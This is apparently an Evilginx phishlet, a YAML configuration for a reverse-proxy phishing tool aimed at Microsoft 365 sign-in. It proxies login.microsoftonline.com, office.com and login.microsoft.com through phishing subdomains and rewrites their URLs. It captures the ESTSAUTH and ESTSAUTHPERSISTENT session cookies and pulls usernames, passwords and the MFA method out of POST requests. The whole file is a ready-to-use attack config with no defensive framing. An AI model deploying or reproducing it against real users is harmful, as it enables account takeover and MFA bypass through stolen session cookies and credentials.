min_ver: '3.0.0'
author: 'LBMC'
proxy_hosts:
  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true, auto_filter: false}
  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: false, is_landing: false, auto_filter: false}
  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoft.com', session: false, is_landing: false, auto_filter: false}

sub_filters:
  - triggers_on: 'login.microsoft.com'
    orig_sub: 'login'
    domain: 'microsoft.com'
    search: 'https://{hostname}/common'
    replace: 'https://{hostname}/common'
    mimes: ['text/html', 'application/json', 'application/javascript']

  - triggers_on: 'login.microsoftonline.com'
    orig_sub: 'login'
    domain: 'microsoftonline.com'
    search: 'https://{hostname}/kmsi'
    replace: 'https://{hostname}/kmsi'
    mimes: ['text/html', 'application/json', 'application/javascript']

  - triggers_on: 'login.microsoftonline.com'
    orig_sub: 'login'
    domain: 'microsoftonline.com'
    search: 'https://{hostname}/common'
    replace: 'https://{hostname}/common'
    mimes: ['text/html', 'application/json', 'application/javascript']

  - triggers_on: 'www.office.com'
    orig_sub: 'www'
    domain: 'office.com'
    search: 'https://{hostname}/login'
    replace: 'https://{hostname}/login'
    mimes: ['text/html', 'application/json', 'application/javascript']

auth_tokens:
  - domain: '.login.microsoftonline.com'
    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'SignInStateCookie']
    type: 'cookie'


credentials:
  username:
    key: '(login|Username)'
    search: '(.*)'
    type: 'post'
  password:
    key: '(passwd|Password|accesspass)'
    search: '(.*)'
    type: 'post'
  custom:
    key: 'mfaAuthMethod'
    search: '(.*)'
    type: 'post'


login:
  domain: 'login.microsoftonline.com'
  path: '/'
